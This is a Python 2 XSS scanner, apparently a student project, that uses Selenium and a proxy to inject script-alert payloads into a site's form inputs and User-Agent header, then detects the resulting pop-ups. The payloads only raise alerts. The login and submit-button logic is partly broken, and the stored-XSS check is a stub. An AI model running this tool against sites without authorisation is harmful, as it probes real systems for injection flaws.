#!/usr/bin/env python
__author__ = "Daniel Williams / C3378215"

from browsermobproxy import Server
import re, sys, json, pickle, base64
import argparse

# ----- Proxy server ----- #
server = Server("/root/Desktop/browsermob-proxy-2.1.0-beta-5/bin/browsermob-proxy")
server.start()
proxy = server.create_proxy()

# ----- Import Selenium Driver/Services ----- #
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.select import Select


# Fetch username, password input boxes and submit button
def fsbmt():
    '''
    locate submit button using Xpaths
    '''
    sb = True
    try:
        try:
            fsbmt.submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            pass
        try:
            fsbmt.submit = driver.find_element_by_xpath("//input[@type='submit']")
        except:
            pass
    except:
        while sb ==True:

            print "could not locate submit button \n"
            # ----- If Submit button can't be located ask user for HTML submit name ----- #
            try:
                submit_name = raw_input("What is the submit box HTML name? ")
                fsbmt.submit = driver.find_element_by_name(submit_name)
                sb = False
            except:
                print "Could not locate submit button"
                pass



def auth(auth1):
    '''
    If -a is set as as an argument, locate login page and acquire session token prior to exploitation
    '''
    looper = True
    while looper == True:
        # ----- Locate Login Page ----- #
        login_url = raw_input("What is the URL of the login page you want to access? \n")
        # ----- if the user does not put http:// at start of url add one ----- #
        if login_url.startswith("http://"):
            try:
                driver.get(login_url)
                looper = False

            except:
                print "Something went wrong trying to load the URL please re-enter the URL \n"
        # ----- If user doesnt enter anything stay in while loop and ask for url again ----- #
        elif login_url == "":
            print "Please enter a URL"
        else:
            add = "http://" + login_url
            driver.get(add)
            looper = False
    # find login boxes
    looper = True

    if auth1 == True:
        while looper == True:
            INPUT_uname = raw_input("What is the Username? \n")
            INPUT_pass = raw_input("What is the Password? \n")
            next = 0
            # Locate login box
            try:
                auth.username = driver.find_element_by_id("login")

            except:

                next = next + 1
                pass

            if next == 1:
                try:
                    auth.username = driver.find_element_by_name("login")

                except:
                    next += 1
                    pass

            if next == 2:
                try:
                    auth.username = driver.find_element_by_name("username")

                except:
                    next += 1
                    pass

            if next == 3:
                try:
                    auth.username = driver.find_element_by_name("email")

                except:
                    next += 1
                    pass

            if next == 4:
                try:
                    auth.username = driver.find_element_by_name("user")

                except:
                    next += 1
                    pass

            if next == 5:
                try:
                    auth.username = driver.find_element_by_name("user_id")

                except:
                    next += 1
                    pass

            if next == 6:
                try:
                    auth.username = driver.find_element_by_name("user-id")
                except:
                    next += 1
                    pass

            if next == 7:
                print "could not locate login field \n"
                login_name = raw_input("What is the login box HTML name? ")
                auth.username = driver.find_element_by_name(login_name)

            # Try to locate password field
            next = 0
            try:
                auth.password = driver.find_element_by_name("password")
            except:
                pass
            if next == 0:
                try:
                    auth.password = driver.find_element_by_name("pass")
                except:
                    next += 1
                    pass
            if next == 1:
                try:
                    auth.password = driver.find_element_by_name("passwd")
                except:
                    next += 1
                    pass
            if next == 2:
                try:
                    auth.password = driver.find_element_by_name("Password")
                except:
                    next += 1
                    pass
            else:
                print "could not locate password field \n"
                Password_name = raw_input("What is the password box HTML name? ")
                auth.username = driver.find_element_by_name(Password_name)
            success = False

            # locate submit field
            fsbmt()
            # enter inputs
            auth.username.send_keys(INPUT_uname)
            auth.password.send_keys(INPUT_pass)
            # click on the submit button
            fsbmt.submit.click()

            if driver.current_url == login_url:
                print "Something Went Wrong During Authentication, try re enter Username & Password"
            else:
                looper = False
            # try:
            #     # If a login box is detected then authentication failed
            #     driver.find_element_by_name("login")
            #
            # except:
            #     try:
            #         driver.find_element_by_name("username")
            #     except:
            #         # return False
            #         looper = False


prnt = False


def my_opt():
    '''
    Parse args from user
    '''
    global prnt
    parser = argparse.ArgumentParser('crosshair <url> -a <scanning page has authentication>')
    parser.add_argument('-u', '--url', dest='url', help='URL to fetch data from')
    parser.add_argument('-a', '--auth', dest='auth', action='store_true', default=False,
                        help="Specify if the page you are scanning requires authentication")
    parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                        help="For Debug Output from the application including get and post responses")

    args = parser.parse_args()
    my_opt.URL = args.url
    my_opt.verb = args.verbose
    if not args.url:
        print 'You must specify a URL.', sys.argv[0], '--help for more details'
        exit(1)
    if args.auth == True:
        auth(args.auth)
    if args.verbose == True:
        prnt = True
    return args
print '''
.     ______  ______  ______  ______  ______       __  __  ______  __  ______    .
 .   /\  ___\/\  == \/\  __ \/\  ___\/\  ___\     /\ \_\ \/\  __ \/\ \/\  == \    .
  .  \ \ \___\ \  __<\ \ \/\ \ \___  \ \___  \    \ \  __ \ \  __ \ \ \ \  __<     .
   .  \ \_____\ \_\ \_\ \_____\/\_____\/\_____\    \ \_\ \_\ \_\ \_\ \_\ \_\ \_\    .
    .  \/_____/\/_/ /_/\/_____/\/_____/\/_____/     \/_/\/_/\/_/\/_/\/_/\/_/ /_/     .
     .                                                                                .
                                                                            '''



# ['-a', '-u','http://192.168.127.178/dvwa/login.php']

# load what you want to test with (change to phantomjs later)
profile = webdriver.FirefoxProfile()
# Setup Proxy
profile.set_proxy(proxy.selenium_proxy())
driver = webdriver.Firefox(firefox_profile=profile)
# Get a a web page
proxy.new_har("Phase1")  # proxy name

# uncomment to reparse args
my_opt()
# args-url location
target_url = my_opt.URL
driver.get(target_url)
pickle.dump(driver.get_cookies(), open("cookies.pkl", "wb"))

token = "l33thax"
escaped_token = "13378080"


def PAYLOAD():
    '''
    XSS Payloads
    '''
    PAYLOAD.PLD1 = '''<script>alert("''' + token + '''")</script>'''
    PAYLOAD.PLD2 = '''"><script>alert("''' + token + '''")</script>'''

    # =============== Payload for Escape quotes =======================#
    PAYLOAD.PLD3 = '''"><script>alert(13378080);</script>'''

    PAYLOAD.PLD4 = """'';!--"<b>b</b><script>alert('""" + escaped_token + """')</script>=&{()}"""


class encoders:
    def html_encode(self, prse):
        '''
        Swaps characters in string
        '''
        html_chars = (
            ("'", '&#39;'),
            ('"', '&quot'),
            (">", '&gt;'),
            ("<", '&lt;'),
            ("&", "&#38;"),
            ("(", '&#40;'),
            (")", '&#41;')

        )
        for chars in html_chars:
            prse = prse.replace(chars[0], chars[1])
        return prse

    def url_encode(self, prse):
        '''
        Swaps characters in string
        '''
        url_chars = (
            ("'", '%27'),
            # lower double quote code
            ('"', '%22'),
            (">", '%3E'),
            ("<", '%3C'),
            ("&", "%26"),
            ("(", '%28'),
            (")", '%29'),
            ('/', '%2F')

        )
        for chars in url_chars:
            prse = prse.replace(chars[0], chars[1])
        return prse


PAYLOAD()
enc = encoders()
alerts_detected = 0


def reg_slice(PHR):
    '''
    Regex Slicing of HAR Data
    :param PHR:
    :return:
    '''

    stp1 = re.findall(r''''queryString':.\[.*?\]''', PHR)

    stp1_url = re.findall(ur'''http:.*?(.*?')''', PHR)

    stp2 = re.findall(r"""'name\\':.*?('.*?')""", str(stp1))
    stp2_value = re.findall(r"""value\\':.*?('.*?')""", str(stp1))

    stp2_url = re.findall(r"""url\\':.*?('.*?')""", str(stp1))

    name_list = re.findall(r"'([A-Za-z]*?)\\", str(stp2))
    stp_3 = re.findall(r"''(.*?)\\", str(stp2_value))

    url_list = []

    for i in stp1_url:
        url_list.append(i[2:-1])

    for i in url_list:
        if name_list[0] in i:
            query1 = i

    value_list = []
    for f in stp2_value:
        f = f[1:-2]
        value_list.append(f)

    reg_slice.qry1 = query1
    reg_slice.nm_lst = name_list
    reg_slice.vl_lst = value_list


def construct_url(target, nmlst, vllst):
    '''
    construct URL from HAR
    :param target:
    :param nmlst:
    :param vllst:
    :return: attack string
    '''
    if target.endswith("?"):
        pass
    else:
        target = target + '?'

    nv_len = 0
    payload_url = []
    payload_url.append(target)

    if len(nmlst) == len(vllst):
        nv_len = len(nmlst)
        pass
    else:
        print "something went wrong acquiring name and value pairs"
        exit(1)

    # replace with custom attack strings
    # cycle2 = 0
    #
    # for i in vllst:
    #     if token in i:
    #         vllst[cycle2] = pload
    #         cycle2 += 1
    construct_url.input_list = nmlst
    construct_url.value_list = vllst
    # Construst Payload url
    list_value = 0
    while nv_len > 0:
        for nm in nmlst:
            payload_url.append(nm)
            payload_url.append('=')
            payload_url.append(vllst[list_value])
            payload_url.append('&')
            list_value += 1
            nv_len -= 1
    payload_url

    at = ''.join(payload_url)
    attack_string = at[:-1]
    return attack_string


def alert_detection(inum):
    # --------- Try to switch to dialogue screen, wait three seconds if no there,
    global alerts_detected
    for num in range(inum):
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                           'Timed out waiting for PA creation ' + 'confirmation popup to appear.')

            driver.switch_to.alert

            a = Alert(driver).text
            if a == token:
                print "A %s token has been detected \n" % a
                alerts_detected += 1
            elif a == escaped_token:
                print "Your quote escapes have been evaded. %s \n" % a
                alerts_detected += 1
            else:
                print "An unexpected alert box was accepted"
            Alert(driver).accept()

            print "Alerts after detection %s" % alerts_detected

            # print check
        except TimeoutException:
            print "no alert"


def question_inputs():
    try:
        INPUT = driver.find_elements_by_tag_name('input')
        question_inputs.input_num = 0
        for num in INPUT:
            question_inputs.input_num += 1
    except:
        print "No inputs were detected"


def XSS_ref():
    # locate submit
    global alerts_detected
    global prnt
    #find submit button
    fsbmt()
    INPUT = driver.find_elements_by_tag_name('input')
    input_num = 0
    print "\n#====== Phase1 ======#"
    # attempt payload1
    for i in INPUT:
        i.send_keys(PAYLOAD.PLD1)
        input_num += 1

    fsbmt.submit.click()
    HAR = proxy.har

    try:
        if prnt == True:
            print json.dumps(HAR, sort_keys=True, indent=4)
    except:
        pass

    reg_slice(str(HAR))
    # construct Payload URL based on target URL, name list from HAR,
    PLD_URL1 = construct_url(target_url, reg_slice.nm_lst, reg_slice.vl_lst)
    print "Payload URL"
    print PLD_URL1

    alert_detection(input_num)

    # Make dictionary of name - value pairs
    nm_val_dict = dict(zip(construct_url.input_list, construct_url.value_list))

    XSS_refToken = alerts_detected

    if alerts_detected > 0:
        print "Reflected XSS has detected on inputs with these names."
        for c, v in nm_val_dict.iteritems():
            if token in v:
                print c

    # if nothing is detected cycle through payloads
    # 1b encode payload
    if alerts_detected == 0:
        try:
            split_start = PLD_URL1.split("?", 1)[0]
            split_end = PLD_URL1.split("?", 1)[1]

            ### ---- Reconect string ---- ###
            split_end = enc.url_encode(split_end)
            # enc_ploadURL = split_start + "?" +enc.html_encode(split_end)
            enc_ploadURL = split_start + "?" + split_end

            print "Attempting payload encoding........................... "

            driver.get(enc_ploadURL)

            XSS_refToken = alerts_detected

            alert_detection(input_num)
            if alerts_detected > 0:
                print "Encoded Reflected XSS has detected on inputs with these names."
                for c, v in nm_val_dict.iteritems():
                    if token in v:
                        print c

        except:
            print "Something went wrong"

    # if nothing is detected cycle through payloads
    if alerts_detected == 0:
        print "\n#====== Phase2 ======#"
        proxy.new_har("Phase2")
        fsbmt()
        try:
            INPUT = driver.find_elements_by_tag_name('input')
            input_num = 0

            # attempt payload1
            for i in INPUT:
                i.send_keys(PAYLOAD.PLD2)
                input_num += 1
                # print "Number of tokens detected in Reflected Get " + tokencount
                # print json.dumps(HAR)
            fsbmt.submit.click()
            HAR = proxy.har
            # #HarDepug print in format
            # print HAR
            try:
                if prnt == True:
                    print json.dumps(HAR, sort_keys=True, indent=4)
            except:
                pass

            reg_slice(str(HAR))
            # construct Payload URL based on target URL, name list from HAR,
            PLD_URL2 = construct_url(target_url, reg_slice.nm_lst, reg_slice.vl_lst)
            print "Payload URL"
            print PLD_URL2

            alert_detection(input_num)

            # Make dictionary of name - value pairs
            nm_val_dict = dict(zip(construct_url.input_list, construct_url.value_list))

            # alert_detection(input_num)
            XSS_refToken = alerts_detected

            if alerts_detected > 0:
                print "Unescaped Reflected XSS e.g has detected on inputs with these names."
                for c, v in nm_val_dict.iteritems():
                    if token in v:
                        print c

        except:
            print "Something Went wrong stage 2 "


            ## Stage 2 Encoding if possible

    # =================   =======Attempt payload 3  escaped chars =========   ========#


    # if nothing is detected cycle through payloads
    if alerts_detected == 0:
        print "\n#====== Phase3 ======#"
        proxy.new_har("Phase3")
        fsbmt()
        try:

            INPUT = driver.find_elements_by_tag_name('input')
            input_num = 0

            # attempt payload1
            for i in INPUT:
                i.send_keys(PAYLOAD.PLD3)
                input_num += 1

            fsbmt.submit.click()
            HAR = proxy.har
            # #HarDepug print in format
            # print HAR
            try:
                if prnt == True:
                    print json.dumps(HAR, sort_keys=True, indent=4)
            except:
                pass

            reg_slice(str(HAR))
            # construct Payload URL based on target URL, name list from HAR,
            PLD_URL3 = construct_url(target_url, reg_slice.nm_lst, reg_slice.vl_lst)

            print "Payload URL"
            print PLD_URL3

            alert_detection(input_num)

            # Make dictionary of name - value pairs
            nm_val_dict = dict(zip(construct_url.input_list, construct_url.value_list))

            # alert_detection(input_num)
            XSS_refToken = alerts_detected
            print alerts_detected
            if alerts_detected > 0:
                print "Unescaped Reflected XSS e.g has detected on inputs with these names."
                for c, v in nm_val_dict.iteritems():
                    if escaped_token in v:
                        print c


        except:
            print "Something Went wrong stage 3 "

    if XSS_refToken > 0:
        print "\nNumber of XSS_Ref tokens detected %s " % XSS_refToken
        alerts_detected += XSS_refToken
    else:
        print "\nNo injection points were detected on the selected site"
        print XSS_refToken

    print "input num %s " % input_num


def XSS_U_agent():
    global alerts_detected
    try:
        print "\n#====== Testing User Agent ======# "
        profile = webdriver.FirefoxProfile()
        profile.set_preference("general.useragent.override", PAYLOAD.PLD3)

        # Setup Proxy'';!--"<XSS>=&{()}
        profile.set_proxy(proxy.selenium_proxy())
        driver = webdriver.Firefox(firefox_profile=profile)

        # WebDriverWait(driver, 2).until(driver.get(target_url))
        driver.get(target_url)

        for cookie in pickle.load(open("cookies.pkl", "rb")):
            driver.add_cookie(cookie)

        driver.get(target_url)

        # User Agent Detection #

        WebDriverWait(driver, 2).until(EC.alert_is_present(),
                                       'Timed out waiting for PA creation ' + 'confirmation popup to appear.')

        driver.switch_to.alert

        a = Alert(driver).text

        if a == token:
            print "XSS has been detected in the user agent field \n"
            alerts_detected += 1
        elif a == escaped_token:
            print "XSS has been detected in the user agent field \n"
            alerts_detected += 1
        else:
            print "An unexpected alert box was accepted"
        Alert(driver).accept()

    except:
        print "No XSS was detected in the useragent"


def XSS_stored():
    global alerts_detected
    XSS_storedToken = 0
    try:
        try:
            submit = driver.find_element_by_xpath("//button[@type='submit']")
        except:
            submit = driver.find_element_by_xpath("//input[@type='submit']")
    except:
        print "could not locate submit button \n"
        submit_name = raw_input("What is the submit box HTML name? ")
        submit = driver.find_element_by_name(submit_name)

    if XSS_storedToken > 0:
        print "\nNumber of XSS_Ref tokens detected %s " % XSS_storedToken
        alerts_detected += XSS_storedToken
    else:
        print "\nNo injection points were detected on the selected site"
        print XSS_storedToken


question_inputs()

if question_inputs.input_num > 0:
    XSS_ref()

    XSS_U_agent()

    if alerts_detected == 0:
        # XSS_stored()
        print "alerts == 0 if "
else:
    XSS_U_agent()
